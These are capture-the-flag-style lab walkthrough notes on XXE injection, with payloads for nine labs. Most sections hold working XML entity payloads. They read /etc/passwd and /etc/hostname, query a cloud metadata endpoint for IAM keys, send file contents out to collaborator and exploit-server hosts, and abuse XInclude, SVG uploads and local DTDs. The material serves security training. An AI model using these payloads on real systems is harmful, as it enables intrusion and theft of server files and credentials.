# Xxe Injection - Walkthroughs

```mermaid
graph TD
    Root["Xxe Injection"]
    Root --> L0["Lab 01"]
    click L0 href "#lab-01"
    Root --> L1["Lab 02"]
    click L1 href "#lab-02"
    Root --> L2["Lab 03"]
    click L2 href "#lab-03"
    Root --> L3["Lab 04"]
    click L3 href "#lab-04"
    Root --> L4["Lab 05"]
    click L4 href "#lab-05"
    Root --> L5["Lab 06"]
    click L5 href "#lab-06"
    Root --> L6["Lab 07"]
    click L6 href "#lab-07"
    Root --> L7["Lab 08"]
    click L7 href "#lab-08"
    Root --> L8["Lab 09"]
    click L8 href "#lab-09"
```

## Lab 01: Exploiting XXE using external entities to retrieve files
<a id="lab-01"></a>

Target Goal - Exploit XXE injection to retrieve the contents of the /etc/passwd file.

## Analysis



---

## Lab 02: Exploiting XXE to perform SSRF attacks
<a id="lab-02"></a>

Target Goal - Exploit the XXE vulnerability to perform an SSRF attack and obtain the server's IAM secret access key

## Analysis


http://169.254.169.254/

---

## Lab 03: Blind XXE with out-of-band interaction
<a id="lab-03"></a>

Target Goal - Exploit the blind XXE vulnerability and perform a DNS lookup and HTTP request to Burp Collaborator.

## Analysis

---

## Lab 04: Blind XXE with out-of-band interaction via XML parameter entities
<a id="lab-04"></a>

Target Goal - Exploit blind XXE injection to issue a DNS lookup and HTTP request to Burp Collaborator.

## Analysis


---

## Lab 05: Exploiting blind XXE to exfiltrate data using a malicious external DTD
<a id="lab-05"></a>

Target Goal - Exploit XXE injection to exfiltrate the content of the /etc/hostname file.

## Analysis


Burp Collaborator
------------------

<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://8bkjkzuczie7f8yiooilk6010s6iu7.oastify.com/?X=%file;'>">
%eval;
%exfil;

Without Burp Collaborator
-------------------------

<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://exploit-0a36000204174338c4c637de0106008f.exploit-server.net/?X=%file;'>">
%eval;
%exfil;

---

## Lab 06: Exploiting blind XXE to retrieve data via error messages
<a id="lab-06"></a>

Target Goal - Exploit blind XXE injection to to trigger an error message that displays the content of the /etc/passwd file.


Doesn't require BURP Collaborator


## Analysis

Regular Entity:
--------------

<!DOCTYPE test [<!ENTITY xxe SYSTEM "z332nczdwnr373gyvtgwiydz4qagy5.oastify.com">]>

Parameter Entity:
-----------------

<!DOCTYPE test [<!ENTITY % xxe SYSTEM "z332nczdwnr373gyvtgwiydz4qagy5.oastify.com"> %xxe;]>

Exfiltration of Data:
---------------------

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;

---

## Lab 07: Exploiting XInclude to retrieve files
<a id="lab-07"></a>

Target Goal - Exploit XXE injection to retrieve the content of the /etc/passwd

## Analysis

<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>


---

## Lab 08: Exploiting XXE via image file upload
<a id="lab-08"></a>

Target Goal - Exploit XXE injection in the file upload functionality to display the content of the /etc/hostname file.

## Analysis

<?xml version="1.0" standalone="yes"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>

f466152c1a55

---

## Lab 09: Exploiting XXE to retrieve data by repurposing a local DTD
<a id="lab-09"></a>

Target Goal - Exploit the XXE injection to trigger an error message containing the contents of the /etc/passwd file.

## Analysis

Regular entity:
--------------

<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

Blind Regular entity:
---------------------

<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://k9udhvjgzvaf2v2dlzdf10um5db3zs.oastify.com">]>

Parameter entity:
----------------

<!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://k9udhvjgzvaf2v2dlzdf10um5db3zs.oastify.com"> %xxe;]>

Repurposing a Local DTD
-----------------------

<!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/doesnotexit"> %xxe;]>


<!DOCTYPE root [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">

    <!ENTITY % ISOamsa '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>



---

